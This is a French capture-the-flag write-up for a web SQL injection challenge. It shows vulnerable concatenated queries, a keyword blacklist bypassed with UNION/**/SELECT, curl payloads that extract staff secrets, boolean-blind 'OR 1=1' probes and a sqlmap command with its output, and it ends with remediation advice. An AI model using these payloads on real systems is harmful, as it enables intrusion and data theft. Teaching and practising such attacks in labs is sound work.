# SQLi Avancée — UNION & Blind

**Catégorie :** Web - SQLi
**Difficulté :** Moyenne/Avancée
**Points :** 250

## Objectif

Extraire des données sensibles de la base via injection UNION-based (avec filtre à contourner) et confirmer une injection blind boolean-based sur un second endpoint.

## Partie 1 — UNION-based avec bypass de filtre

### Vulnérabilité

Le endpoint `/` (paramètre `q`) construit la requête par concaténation :
```python
query = f"SELECT name, price, category FROM products WHERE name LIKE '%{q}%'"
```

Un filtre naïf bloque la sous-chaîne exacte `union select` (en minuscules après normalisation) :
```python
BLACKLIST = ["union select", "UNION SELECT", "drop table", "DROP TABLE"]
def is_blocked(payload):
    return any(bad.lower() in payload.lower() for bad in BLACKLIST)
```

### Bypass

Le filtre vérifie une sous-chaîne continue `union select` (avec espace). En insérant un commentaire SQL vide `/**/` entre les deux mots-clés, la chaîne littérale `union select` n'apparaît plus, mais SQLite interprète toujours `UNION` et `SELECT` comme deux tokens distincts (le commentaire agissant comme séparateur, équivalent à un espace).

### Exploitation

```bash
curl -G "http://<cible>:5001/" --data-urlencode \
  "q=%' UNION/**/SELECT username,secret,'staff' FROM staff--"
```

La requête résultante devient :
```sql
SELECT name, price, category FROM products WHERE name LIKE '%%' UNION/**/SELECT username,secret,'staff' FROM staff--%'
```

Le `%` initial fait matcher tous les produits ; le `UNION/**/SELECT` ajoute les données de la table `staff` (3 colonnes requises, alignées avec `products`).

### Résultat

Le tableau retourné inclut une ligne supplémentaire :
```
manager | FLAG{un10n_b4s3d_3xf1ltr4t10n} | staff
```

## Partie 2 — Blind Boolean-based

### Vulnérabilité

Le endpoint `/check` (paramètre `name`) n'a aucun filtre, mais ne renvoie jamais les données — seulement un booléen :
```python
query = f"SELECT 1 FROM products WHERE name = '{name}'"
found = cur.fetchone() is not None
return {"exists": found}
```

### Exploitation manuelle

```bash
curl -G "http://<cible>:5001/check" --data-urlencode "name=' OR '1'='1"
# {"exists": true}

curl -G "http://<cible>:5001/check" --data-urlencode "name=inexistant' OR '1'='1"
# {"exists": true}  <- alors que "inexistant" ne devrait rien matcher
```

La condition `OR '1'='1'` rend la clause `WHERE` toujours vraie, prouvant le contrôle sur la requête. En itérant ce principe caractère par caractère (ex: `AND substr(secret,1,1)='F'`), on peut extraire n'importe quelle donnée bit par bit sans jamais la voir directement.

### Confirmation automatisée avec sqlmap

```bash
sqlmap -u "http://<cible>:5001/check?name=Espresso" -p name --technique=B --string="true" --batch --level=3 --risk=2
```

sqlmap confirme l'injection et identifie le DBMS (SQLite) :
```
Parameter: name (GET)
    Type: boolean-based blind
    Payload: name=Espresso' AND 5199=5199-- jTnq
back-end DBMS: SQLite
```

Note : la baseline doit utiliser une valeur existante (`Espresso`) pour que sqlmap puisse distinguer vrai/faux — une valeur inexistante (`test`) donne toujours `false`, quelle que soit l'injection.

## Flag

```
FLAG{un10n_b4s3d_3xf1ltr4t10n}
```

## Remédiation

- Requêtes paramétrées partout, y compris sur les endpoints qui semblent "sans danger" (pas de retour de données brutes).
- Ne jamais implémenter de filtrage par liste noire de mots-clés — facilement contournable (casse, commentaires, encodage). Utiliser une liste blanche stricte ou, mieux, des requêtes préparées qui rendent le filtrage inutile.
- Limiter les permissions du compte DB applicatif (pas d'accès aux tables sensibles comme `staff` depuis le même utilisateur que `products`).
